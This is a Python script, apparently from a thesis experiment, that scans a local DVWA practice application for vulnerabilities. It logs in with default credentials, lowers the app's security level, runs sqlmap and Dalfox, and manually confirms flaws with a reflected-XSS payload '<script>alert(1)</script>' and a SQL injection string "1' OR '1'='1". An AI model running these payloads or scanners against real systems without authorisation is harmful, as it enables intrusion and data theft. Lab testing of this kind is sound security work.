import requests, subprocess, sys, os, json

target = "http://127.0.0.1:3002"
TOOLS = "D:\\大论文\\tools"
findings = []
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

s = requests.Session()

print("=== Step 1: Login + Setup ===")
s.post(target + "/login.php", data={"username":"admin","password":"password","Login":"Login"}, timeout=5)
print("  PHPSESSID: %s" % s.cookies.get("PHPSESSID", "NONE"))

s.post(target + "/setup.php", data={"create_db":"Create/Reset Database"}, timeout=5)
print("  DB initialized")

s.post(target + "/security.php", data={"security":"low","seclev_submit":"Submit"})
print("  Security level: low")

# SQLMap on SQLi page
print()
print("=== Step 2: SQLMap on SQLi ===")
cookie_str = "PHPSESSID=%s; security=low" % s.cookies["PHPSESSID"]
cmd = [sys.executable, "-m", "sqlmap", "-u", target + "/vulnerabilities/sqli/?id=1&Submit=Submit",
       "--cookie", cookie_str,
       "--batch", "--level", "3", "--risk", "2",
       "--output-dir", "sqlmap_dvwa", "--flush-session",
       "--answers", "follow=N"]
r = subprocess.run(cmd, capture_output=True, timeout=180)
out = (r.stdout + r.stderr).decode("utf-8", "replace")
sqli_found = False
for line in out.split("\n"):
    l = line.strip()
    if "is vulnerable" in l.lower() or "injectable" in l.lower():
        print("  SQLMap: %s" % l[:120])
        findings.append({"target":"dvwa","scanner":"sqlmap","type":"sql_injection",
            "severity":"critical","url":target+"/vulnerabilities/sqli/",
            "desc":"SQL injection confirmed by SQLMap: %s" % l[:100],"evidence":l})
        sqli_found = True
if not sqli_found:
    print("  SQLMap: No injection detected at level 3")

# Dalfox on XSS page
print()
print("=== Step 3: Dalfox on XSS ===")
xss_url = target + "/vulnerabilities/xss_r/?name=test"
r = subprocess.run([os.path.join(TOOLS, "dalfox.exe"), "url", "--url", xss_url, "--silence",
                    "--header", "Cookie: " + cookie_str],
                   capture_output=True, timeout=60)
out = r.stdout.decode("utf-8", "replace")
if "XSS" in out or "VULN" in out:
    print("  Dalfox: XSS found!")
    findings.append({"target":"dvwa","scanner":"dalfox","type":"xss",
        "severity":"high","url":xss_url,
        "desc":"Reflected XSS detected by Dalfox","evidence":out[:200]})
else:
    print("  Dalfox: No XSS detected")

# Manual XSS verification
print()
print("=== Step 4: Manual XSS verification ===")
r = s.get(target + "/vulnerabilities/xss_r/?name=<script>alert(1)</script>", timeout=5)
body = r.text
payload = "<script>alert(1)</script>"
if payload in body:
    print("  XSS: CONFIRMED - input reflected unencoded!")
    findings.append({"target":"dvwa","scanner":"manual","type":"xss",
        "severity":"high","url":target+"/vulnerabilities/xss_r/",
        "desc":"Reflected XSS confirmed - <script>alert(1)</script> reflected unencoded","evidence":body[:500]})
else:
    print("  XSS: Input not reflected unencoded")

# Manual SQLi verification
print()
print("=== Step 5: Manual SQLi verification ===")
r = s.get(target + "/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit", timeout=5)
body = r.text
if "First name" in body and "Surname" in body:
    print("  SQLi: CONFIRMED with id=1' OR '1'='1")
    findings.append({"target":"dvwa","scanner":"manual","type":"sql_injection",
        "severity":"critical","url":target+"/vulnerabilities/sqli/",
        "desc":"SQL injection confirmed - id=1' OR '1'='1 returned user data","evidence":body[:500]})
else:
    print("  SQLi: Not detected with basic payload")

# Print summary
print()
print("=" * 60)
print("DVWA SCAN RESULTS")
print("=" * 60)
for f in findings:
    print("  [%s] [%s] %s | %s" % (f["severity"][:4], f["scanner"], f["type"], f["desc"][:80]))
print("Total: %d findings" % len(findings))

outpath = "scripts/experiment/real_findings_dvwa.json"
with open(outpath, "w", encoding="utf-8") as f:
    json.dump(findings, f, indent=2, ensure_ascii=False)
print("Saved to: %s" % outpath)
